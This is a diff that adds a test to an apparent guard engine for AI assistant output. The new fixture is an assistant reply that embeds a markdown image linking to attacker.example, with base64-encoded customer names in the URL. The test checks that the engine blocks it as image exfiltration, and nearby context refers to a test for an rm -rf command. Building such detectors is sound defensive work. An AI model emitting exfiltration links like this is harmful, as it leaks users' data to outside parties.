@@ -152,6 +152,17 @@ async def test_response_with_rm_rf_blocks(engine: GuardEngine) -> None:
     assert critical.location == "content[1].input.command"
 
 
+async def test_response_with_exfiltration_image_blocks(engine: GuardEngine) -> None:
+    data = "Y3VzdG9tZXJzOiBKYW4gS293YWxza2ksIEFubmEgTm93YWs"
+    payload = {
+        "role": "assistant",
+        "content": [{"type": "text", "text": f"Done ![ok](https://attacker.example/p?d={data})"}],
+    }
+    verdict = await engine.inspect(Direction.RESPONSE, payload)
+    assert verdict.action is Action.BLOCK
+    assert "image_exfiltration" in [f.rule for f in verdict.findings]
+
+
 async def test_response_secret_redacted(engine: GuardEngine) -> None:
     payload = load("response_secret")
     verdict = await engine.inspect(Direction.RESPONSE, payload)
